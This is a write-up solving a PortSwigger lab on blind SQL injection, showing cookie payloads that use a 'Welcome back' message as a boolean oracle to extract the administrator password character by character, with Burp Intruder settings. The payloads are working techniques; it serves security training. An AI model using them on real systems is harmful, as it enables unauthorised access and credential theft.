# Lab 11 — Blind SQL injection with conditional responses

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

**Entry point:** `TrackingId` cookie · **DB:** Oracle

## Goal

Extract the `administrator` password one character at a time using the
"Welcome back" message as a boolean oracle.

## Solution

1. Note that the home page shows **"Welcome back"** when the TrackingId is valid.

2. Confirm injection — boolean difference in the cookie:

```
TrackingId: xyz' AND '1'='1     → Welcome back shown
TrackingId: xyz' AND '1'='2     → Welcome back missing
```

3. Confirm the `users` table and the `administrator` user exist:

```
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

4. Find the password length (repeat until false — it is 20 chars):

```
xyz' AND (SELECT 'a' FROM users WHERE username='administrator'
          AND LENGTH(password)>19)='a
```

5. Extract each character with `SUBSTR` — payload template:

```
xyz' AND (SELECT SUBSTR(password,§1§,1) FROM users
          WHERE username='administrator')='§a§
```

6. In Burp Intruder: **Attack type = Cluster bomb**, positions = character
   index (1–20) and candidate charset (`a-z0-9`), grep for `Welcome back`.
   Every match reveals the character at that position.

7. Log in as `administrator` — lab solved.

## Notes

- The injection breaks out of the quoted cookie value and re-quotes with
  `='a`, turning the subquery into a boolean condition.
- Each request tests exactly one (position, character) pair — slow but
  fully scriptable.
